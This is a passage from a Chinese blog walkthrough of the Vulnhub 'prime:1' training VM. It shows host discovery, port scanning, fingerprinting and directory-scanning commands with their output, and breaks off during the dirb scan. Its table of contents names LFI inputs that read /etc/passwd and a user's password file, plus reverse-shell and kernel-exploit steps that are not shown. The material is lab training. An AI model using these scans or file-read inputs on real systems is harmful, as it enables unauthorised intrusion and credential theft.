<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>vuInhub靶场实战系列--prime:1 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/93a44948c09770ee05c74e9048de49c0/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="vuInhub靶场实战系列--prime:1">
  <meta property="og:description" content="免责声明 本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。
目录 免责声明前言一、环境配置1.1 靶场信息1.2 靶场配置 二、信息收集2.1 主机发现2.1.1 netdiscover2.1.2 nmap主机扫描2.1.3 arp-scan主机扫描 2.2 端口扫描2.2.1 masscan扫描2.2.2 nmap扫描 2.3 指纹识别2.4 目录扫描2.4.1 dirb目录扫描2.4.2 dirsearch目录扫描 2.5 漏洞切入点2.5.1 访问登录页2.5.2 访问dev页2.5.3 访问wordpress页2.5.4 poc扫描 三、渗透测试3.1 wfuzz和LFI3.1.1 wfuzz爆破参数3.1.2 LFI3.1.2.1 file参数3.1.2.2 secrettier360参数3.1.2.2.1 secrettier360=3.1.2.2.2 secrettier360=FUZZ3.1.2.2.3 secrettier360=dev3.1.2.2.4 secrettier360=/etc/passwd3.1.2.2.5 secrettier360=/home/saket/password.txt 3.2 WordPress漏洞3.2.1 列举用户名3.2.1.1 cmseek扫描3.2.1.2 wpscan扫描 3.2.2 登录管理页3.2.3 msfconsole3.2.3.1 msfvenom生成反弹shell3.2.3.2 msf监听4567端口3.2.3.3 访问测试 3.3 Linux内核漏洞提权3.3.1 漏洞查找3.3.2 复制poc3.3.3 编译poc文件3.3.4 上传编译poc3.3.5 执行编译poc3.3.5.1 目录切换3.3.5.2 赋予可执行权限3.3.5.3 执行编译文件 渗透总结参考文章 前言 今日测试内容渗透prime:1靶机：
Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞。本文介绍prime:1靶机渗透测试，内容包括主机扫描（nmap\netdiscover）、端口扫描（nmap\masscan）、目录扫描（dirb\dirsearch）、wpscan、msf、netcat、反弹shell、linux内核提权等内容。
Description
Back to the Top
This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam.">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-06-05T23:34:22+08:00">
    <meta property="article:modified_time" content="2024-06-05T23:34:22+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">vuInhub靶场实战系列--prime:1</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>免责声明</h2> 
<p><code>本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。</code></p> 
<p></p> 
<div class="toc"> 
 <h4>目录</h4> 
 <ul><li><a href="#_0" rel="nofollow">免责声明</a></li><li><a href="#_7" rel="nofollow">前言</a></li><li><a href="#_20" rel="nofollow">一、环境配置</a></li><li><ul><li><a href="#11__21" rel="nofollow">1.1 靶场信息</a></li><li><a href="#12__29" rel="nofollow">1.2 靶场配置</a></li></ul> 
  </li><li><a href="#_34" rel="nofollow">二、信息收集</a></li><li><ul><li><a href="#21__35" rel="nofollow">2.1 主机发现</a></li><li><ul><li><a href="#211_netdiscover_36" rel="nofollow">2.1.1 netdiscover</a></li><li><a href="#212_nmap_52" rel="nofollow">2.1.2 nmap主机扫描</a></li><li><a href="#213_arpscan_75" rel="nofollow">2.1.3 arp-scan主机扫描</a></li></ul> 
   </li><li><a href="#22__94" rel="nofollow">2.2 端口扫描</a></li><li><ul><li><a href="#221_masscan_95" rel="nofollow">2.2.1 masscan扫描</a></li><li><a href="#222_nmap_104" rel="nofollow">2.2.2 nmap扫描</a></li></ul> 
   </li><li><a href="#23__132" rel="nofollow">2.3 指纹识别</a></li><li><a href="#24__181" rel="nofollow">2.4 目录扫描</a></li><li><ul><li><a href="#241_dirb_182" rel="nofollow">2.4.1 dirb目录扫描</a></li><li><a href="#242_dirsearch_314" rel="nofollow">2.4.2 dirsearch目录扫描</a></li></ul> 
   </li><li><a href="#25__368" rel="nofollow">2.5 漏洞切入点</a></li><li><ul><li><a href="#251__369" rel="nofollow">2.5.1 访问登录页</a></li><li><a href="#252_dev_374" rel="nofollow">2.5.2 访问dev页</a></li><li><a href="#253_wordpress_380" rel="nofollow">2.5.3 访问wordpress页</a></li><li><a href="#254_poc_385" rel="nofollow">2.5.4 poc扫描</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_426" rel="nofollow">三、渗透测试</a></li><li><ul><li><a href="#31_wfuzzLFI_428" rel="nofollow">3.1 wfuzz和LFI</a></li><li><ul><li><a href="#311_wfuzz_429" rel="nofollow">3.1.1 wfuzz爆破参数</a></li><li><a href="#312_LFI_456" rel="nofollow">3.1.2 LFI</a></li><li><ul><li><a href="#3121_file_457" rel="nofollow">3.1.2.1 file参数</a></li><li><a href="#3122_secrettier360_464" rel="nofollow">3.1.2.2 secrettier360参数</a></li><li><ul><li><a href="#31221_secrettier360_465" rel="nofollow">3.1.2.2.1 secrettier360=</a></li><li><a href="#31222_secrettier360FUZZ_474" rel="nofollow">3.1.2.2.2 secrettier360=FUZZ</a></li><li><a href="#31223_secrettier360dev_502" rel="nofollow">3.1.2.2.3 secrettier360=dev</a></li><li><a href="#31224_secrettier360etcpasswd_507" rel="nofollow">3.1.2.2.4 secrettier360=/etc/passwd</a></li><li><a href="#31225_secrettier360homesaketpasswordtxt_515" rel="nofollow">3.1.2.2.5 secrettier360=/home/saket/password.txt</a></li></ul> 
    </li></ul> 
   </li></ul> 
   </li><li><a href="#32_WordPress_528" rel="nofollow">3.2 WordPress漏洞</a></li><li><ul><li><a href="#321__530" rel="nofollow">3.2.1 列举用户名</a></li><li><ul><li><a href="#3211_cmseek_531" rel="nofollow">3.2.1.1 cmseek扫描</a></li><li><a href="#3212_wpscan_605" rel="nofollow">3.2.1.2 wpscan扫描</a></li></ul> 
    </li><li><a href="#322__720" rel="nofollow">3.2.2 登录管理页</a></li><li><a href="#323_msfconsole_736" rel="nofollow">3.2.3 msfconsole</a></li><li><ul><li><a href="#3231_msfvenomshell_737" rel="nofollow">3.2.3.1 msfvenom生成反弹shell</a></li><li><a href="#3232_msf4567_769" rel="nofollow">3.2.3.2 msf监听4567端口</a></li><li><a href="#3233__851" rel="nofollow">3.2.3.3 访问测试</a></li></ul> 
   </li></ul> 
   </li><li><a href="#33_Linux_909" rel="nofollow">3.3 Linux内核漏洞提权</a></li><li><ul><li><a href="#331__910" rel="nofollow">3.3.1 漏洞查找</a></li><li><a href="#332_poc_964" rel="nofollow">3.3.2 复制poc</a></li><li><a href="#333_poc_975" rel="nofollow">3.3.3 编译poc文件</a></li><li><a href="#334_poc_988" rel="nofollow">3.3.4 上传编译poc</a></li><li><a href="#335_poc_1019" rel="nofollow">3.3.5 执行编译poc</a></li><li><ul><li><a href="#3351__1020" rel="nofollow">3.3.5.1 目录切换</a></li><li><a href="#3352__1025" rel="nofollow">3.3.5.2 赋予可执行权限</a></li><li><a href="#3353__1049" rel="nofollow">3.3.5.3 执行编译文件</a></li></ul> 
   </li></ul> 
  </li></ul> 
  </li><li><a href="#_1087" rel="nofollow">渗透总结</a></li><li><a href="#_1097" rel="nofollow">参考文章</a></li></ul> 
</div> 
<p></p> 
<hr> 
<h2><a id="_7"></a>前言</h2> 
<p><code>今日测试内容渗透prime:1靶机：</code></p> 
<p>Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞。本文介绍prime:1靶机渗透测试，内容包括主机扫描（nmap\netdiscover）、端口扫描（nmap\masscan）、目录扫描（dirb\dirsearch）、wpscan、msf、netcat、反弹shell、linux内核提权等内容。</p> 
<blockquote> 
 <p>Description<br> Back to the Top<br> This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam.<br> This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox’s machines are designed.<br> So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed<br> Visit our website http://hacknpentest.com and http://hnpsecurity.com.<br> Some extra improvement needed to my VM please contact me on my email- suraj at hnpsecurity dot com.</p> 
</blockquote> 
<hr> 
<h2><a id="_20"></a>一、环境配置</h2> 
<h3><a id="11__21"></a>1.1 靶场信息</h3> 
<table><thead><tr><th>官方链接</th><th>https://www.vulnhub.com/entry/prime-1,358/</th></tr></thead><tbody><tr><td>发布日期</td><td>2019年9月1日</td></tr><tr><td>靶场大小</td><td>2.2GB</td></tr><tr><td>作者</td><td>Suraj Pandey</td></tr><tr><td>系列</td><td>Prime</td></tr><tr><td>难度</td><td>★★☆☆☆</td></tr></tbody></table> 
<h3><a id="12__29"></a>1.2 靶场配置</h3> 
<ul><li>渗透测试环境配置，请参考作者前面的内容<a href="https://editor.csdn.net/md/?articleId=139026849" rel="nofollow">vuInhub靶场实战系列-DC-2实战</a></li></ul> 
<hr> 
<h2><a id="_34"></a>二、信息收集</h2> 
<h3><a id="21__35"></a>2.1 主机发现</h3> 
<h4><a id="211_netdiscover_36"></a>2.1.1 netdiscover</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># netdiscover -i eth0 -r 192.168.6.0/24   </span>
 Currently scanning: Finished<span class="token operator">!</span>   <span class="token operator">|</span>   Screen View: Unique Hosts                     
                                                                                   
 <span class="token number">169</span> Captured ARP Req/Rep packets, from <span class="token number">4</span> hosts.   Total size: <span class="token number">10140</span>               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 <span class="token number">192.168</span>.6.1     00:50:56:c0:00:08    <span class="token number">148</span>    <span class="token number">8880</span>  VMware, Inc.                    
 <span class="token number">192.168</span>.6.2     00:50:56:f5:7b:9f     <span class="token number">14</span>     <span class="token number">840</span>  VMware, Inc.                    
 <span class="token number">192.168</span>.6.162   00:0c:29:0a:67:ce      <span class="token number">5</span>     <span class="token number">300</span>  VMware, Inc.                    
 <span class="token number">192.168</span>.6.254   00:50:56:ec:e5:84      <span class="token number">2</span>     <span class="token number">120</span>  VMware, Inc.                                                                   

</code></pre> 
<h4><a id="212_nmap_52"></a>2.1.2 nmap主机扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># nmap -sP 192.168.6.0/24              </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-05 07:45 EDT
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.1
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00025s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:C0:00:08 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.2
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00020s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:F5:7B:9F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.162
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0011s latency<span class="token punctuation">)</span>.
MAC Address: 00:0C:29:0A:67:CE <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.254
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0016s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:EC:E5:84 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.66
Host is up.
Nmap done: <span class="token number">256</span> IP addresses <span class="token punctuation">(</span><span class="token number">5</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">28.20</span> seconds
 
</code></pre> 
<h4><a id="213_arpscan_75"></a>2.1.3 arp-scan主机扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># arp-scan -l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:b6:02:f0, IPv4: <span class="token number">192.168</span>.6.66
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.6.1	00:50:56:c0:00:08	VMware, Inc.
<span class="token number">192.168</span>.6.2	00:50:56:f5:7b:9f	VMware, Inc.
<span class="token number">192.168</span>.6.162	00:0c:29:0a:67:ce	VMware, Inc.
<span class="token number">192.168</span>.6.254	00:50:56:ec:e5:84	VMware, Inc.
<span class="token number">192.168</span>.6.1	00:50:56:c0:00:08	VMware, Inc. <span class="token punctuation">(</span>DUP: <span class="token number">2</span><span class="token punctuation">)</span>


</code></pre> 
<blockquote> 
 <p>综上所述的三种扫描方式，获得靶机信息<br> <strong>IP地址：192.168.6.162</strong><br> <strong>MAC地址：00:0c:29:0a:67:ce</strong></p> 
</blockquote> 
<h3><a id="22__94"></a>2.2 端口扫描</h3> 
<h4><a id="221_masscan_95"></a>2.2.1 masscan扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># masscan --rate=10000 --ports 0-65535 192.168.6.162</span>
Starting masscan <span class="token number">1.3</span>.2 <span class="token punctuation">(</span>http://bit.ly/14GZzcT<span class="token punctuation">)</span> at <span class="token number">2024</span>-06-05 <span class="token number">11</span>:48:48 GMT
Initiating SYN Stealth Scan
Scanning <span class="token number">1</span> hosts <span class="token punctuation">[</span><span class="token number">65536</span> ports/host<span class="token punctuation">]</span>
Discovered <span class="token function">open</span> port <span class="token number">22</span>/tcp on <span class="token number">192.168</span>.6.162     
</code></pre> 
<h4><a id="222_nmap_104"></a>2.2.2 nmap扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># nmap -sC -sV -oA prime-1 192.168.6.162</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-05 07:51 EDT
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.162
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00079s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.8 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">94</span>:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: HacknPentest
<span class="token operator">|</span>_http-server-header: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
MAC Address: 00:0C:29:0A:67:CE <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">20.65</span> seconds

</code></pre> 
<blockquote> 
 <p>综上所述，获得靶机开放的端口信息：<br> 22端口：ssh服务 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br> 80端口：http服务 Apache httpd 2.4.18 ((Ubuntu))</p> 
</blockquote> 
<h3><a id="23__132"></a>2.3 指纹识别</h3> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># whatweb -v 192.168.6.162</span>
WhatWeb report <span class="token keyword">for</span> http://192.168.6.162
Status    <span class="token builtin class-name">:</span> <span class="token number">200</span> OK
Title     <span class="token builtin class-name">:</span> HacknPentest
IP        <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.6.162
Country   <span class="token builtin class-name">:</span> RESERVED, ZZ

Summary   <span class="token builtin class-name">:</span> Apache<span class="token punctuation">[</span><span class="token number">2.4</span>.18<span class="token punctuation">]</span>, HTTPServer<span class="token punctuation">[</span>Ubuntu Linux<span class="token punctuation">]</span><span class="token punctuation">[</span>Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">]</span>

Detected Plugins:
<span class="token punctuation">[</span> Apache <span class="token punctuation">]</span>
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server <span class="token keyword">for</span> modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services <span class="token keyword">in</span> <span class="token function">sync</span> with the current 
	HTTP standards. 

	Version      <span class="token builtin class-name">:</span> <span class="token number">2.4</span>.18 <span class="token punctuation">(</span>from HTTP Server Header<span class="token punctuation">)</span>
	Google Dorks: <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
	Website     <span class="token builtin class-name">:</span> http://httpd.apache.org/

<span class="token punctuation">[</span> HTTPServer <span class="token punctuation">]</span>
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           <span class="token builtin class-name">:</span> Ubuntu Linux
	String       <span class="token builtin class-name">:</span> Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> <span class="token punctuation">(</span>from server string<span class="token punctuation">)</span>

HTTP Headers:
	HTTP/1.1 <span class="token number">200</span> OK
	Date: Wed, 05 Jun <span class="token number">2024</span> <span class="token number">11</span>:54:25 GMT
	Server: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
	Vary: Accept-Encoding
	Content-Encoding: <span class="token function">gzip</span>
	Content-Length: <span class="token number">132</span>
	Connection: close
	Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8
	

</code></pre> 
<blockquote> 
 <p>获得一些关键信息;<br> Summary : Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]<br> 获得信息和上一步进行端口扫描差不多。</p> 
</blockquote> 
<h3><a id="24__181"></a>2.4 目录扫描</h3> 
<h4><a id="241_dirb_182"></a>2.4.1 dirb目录扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># dirb http://192.168.6.162</span>

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun  <span class="token number">5</span> 07:56:25 <span class="token number">2024</span>
URL_BASE: http://192.168.6.162/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: <span class="token number">4612</span>                                                          

---- Scanning URL: http://192.168.6.162/ ----
+ http://192.168.6.162/dev <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:131<span class="token punctuation">)</span>                                                                                                   
+ http://192.168.6.162/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:136<span class="token punctuation">)</span>                                                                                             
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/javascript/                                                                                                  
+ http://192.168.6.162/server-status <span class="token punctuation">(</span>CODE:403<span class="token operator">|</span>SIZE:278<span class="token punctuation">)</span>                                                                                         
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/                                                                                                   
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/javascript/ ----
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/javascript/jquery/                                                                                           
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/ ----
+ http://192.168.6.162/wordpress/index.php <span class="token punctuation">(</span>CODE:301<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                                     
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/                                                                                          
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-content/                                                                                        
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-includes/                                                                                       
+ http://192.168.6.162/wordpress/xmlrpc.php <span class="token punctuation">(</span>CODE:405<span class="token operator">|</span>SIZE:42<span class="token punctuation">)</span>                                                                                   
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/javascript/jquery/ ----
+ http://192.168.6.162/javascript/jquery/jquery <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:284394<span class="token punctuation">)</span>                                                                           
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/ ----
+ http://192.168.6.162/wordpress/wp-admin/admin.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                            
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/css/                                                                                      
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/images/                                                                                   
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/includes/                                                                                 
+ http://192.168.6.162/wordpress/wp-admin/index.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                            
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/js/                                                                                       
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/maint/                                                                                    
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/network/                                                                                  
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-admin/user/                                                                                     
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-content/ ----
+ http://192.168.6.162/wordpress/wp-content/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                          
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-content/plugins/                                                                                
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-content/themes/                                                                                 
<span class="token operator">==</span><span class="token operator">&gt;</span> DIRECTORY: http://192.168.6.162/wordpress/wp-content/uploads/                                                                                
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-includes/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/css/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/images/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/includes/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/js/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/maint/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/network/ ----
+ http://192.168.6.162/wordpress/wp-admin/network/admin.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                    
+ http://192.168.6.162/wordpress/wp-admin/network/index.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                    
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-admin/user/ ----
+ http://192.168.6.162/wordpress/wp-admin/user/admin.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                       
+ http://192.168.6.162/wordpress/wp-admin/user/index.php <span class="token punctuation">(</span>CODE:302<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                       
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-content/plugins/ ----
+ http://192.168.6.162/wordpress/wp-content/plugins/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                  
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-content/themes/ ----
+ http://192.168.6.162/wordpress/wp-content/themes/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:0<span class="token punctuation">)</span>                                                                   
                                                                                                                                                 
---- Entering directory: http://192.168.6.162/wordpress/wp-content/uploads/ ----
<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
    <span class="token punctuation">(</span>Use mode <span class="token string">'-w'</span> <span class="token keyword">if</span> you want to scan it anyway<span class="token punctuation">)</span>
                                                                               
-----------------
